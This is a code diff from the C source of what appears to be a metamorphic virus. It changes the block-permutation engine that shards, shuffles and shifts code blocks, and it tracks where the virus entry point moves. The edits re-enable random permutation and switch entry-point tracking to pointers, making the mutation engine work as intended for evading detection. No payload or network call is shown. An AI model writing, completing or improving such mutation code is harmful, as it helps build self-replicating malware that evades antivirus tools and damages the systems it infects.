@@ -164,8 +164,7 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS], \
 
 static bool     want_to_permutate(uint64_t *seed)
 {
-	// return random(seed) % 2;
-	return true;
+	return random(seed) % 2;
 }
 
 /*
@@ -247,17 +246,17 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 
 /* --------------------------- Shift entry point ---------------------------- */
 
-static bool	shift_entry_point(size_t virus_entry_point, \
+static bool	shift_entry_point(void *input_virus_address, \
 			int32_t *virus_func_shift,
 			struct code_block *blocks[NBLOCKS])
 {
 	for (size_t i = 0 ; i < NBLOCKS; i++)
 	{
 		struct code_block	*b = blocks[i];
-		size_t	block_start = (size_t)b->ref.ptr;
-		size_t	block_end   = (size_t)b->ref.ptr + b->ref.size;
+		void	*block_start = b->ref.ptr;
+		void	*block_end   = b->ref.ptr + b->ref.size;
 
-		if (virus_entry_point >= block_start && virus_entry_point < block_end)
+		if (input_virus_address >= block_start && input_virus_address < block_end)
 		{
 			*virus_func_shift = b->shift_amount;
 			return true;
@@ -384,7 +383,7 @@ static bool	write_permutated_code(struct safe_ptr input_code, \
 bool		permutate_blocks(struct safe_ptr input_code, \
 			struct safe_ptr output_buffer, \
 			size_t *output_size,
-			size_t virus_entry_point, int32_t *virus_func_shift, \
+			void *input_virus_address, int32_t *virus_func_shift, \
 			uint64_t seed)
 { // TODO adapt proto
 	struct block_allocation		block_memory;
@@ -394,12 +393,12 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
-	|| !shift_entry_point(virus_entry_point, virus_func_shift, blocks)// impossible if we don't know where virus is!
+	|| !shift_entry_point(input_virus_address, virus_func_shift, blocks)
 	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 #ifdef DEBUG
 	// print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
-	print_general(input_code, output_buffer, (size_t)virus_entry_point, *virus_func_shift, *output_size, seed);
+	print_general(input_code, output_buffer, (size_t)input_virus_address, *virus_func_shift, *output_size, seed);
 #endif
 	return true;
 }
